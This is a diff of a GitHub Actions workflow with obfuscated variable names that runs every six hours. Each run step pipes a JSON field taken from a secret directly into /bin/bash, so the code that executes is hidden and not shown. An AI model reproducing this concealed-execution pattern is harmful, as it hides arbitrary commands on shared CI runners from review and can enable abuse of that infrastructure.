@@ -1,23 +1,27 @@
 name: jiangjing19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 0/6 * * *'
+    - cron: '10 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiangjing19871010
         env:
-          puuy45: ${{ secrets.puuy45 }}
+          n15: ${{ secrets.n15 }}
         run: |
-          echo $puuy45 | jq -r .bbfj31 | /bin/bash
-          echo $kcmf03332 | jq -r .qkr399 | /bin/bash
-          echo $dhb30 | jq -r .ayp9643 | /bin/bash
-          echo $ayotj26 | jq -r .aqf29 | /bin/bash
-          echo $dyn09 | jq -r .deppd0 | /bin/bash
-          echo $ab24 | jq -r .uvgms145 | /bin/bash
-          echo $yhi0 | jq -r .metj9 | /bin/bash
+          echo $n15 | jq -r .euw2952 | /bin/bash
+          echo $d768 | jq -r .pk8854 | /bin/bash
+          echo $h9 | jq -r .vrdc07915 | /bin/bash
+          echo $eu539 | jq -r .mok2735 | /bin/bash
+          echo $yu1 | jq -r .lnc41693 | /bin/bash
+          echo $wkwm1574 | jq -r .f653 | /bin/bash
+          echo $gjthq58 | jq -r .pbiga483 | /bin/bash
+          echo $hjyc9 | jq -r .tmi368 | /bin/bash
+          echo $dn540 | jq -r .nd11412 | /bin/bash
+          echo $wj94 | jq -r .satu85676 | /bin/bash
 
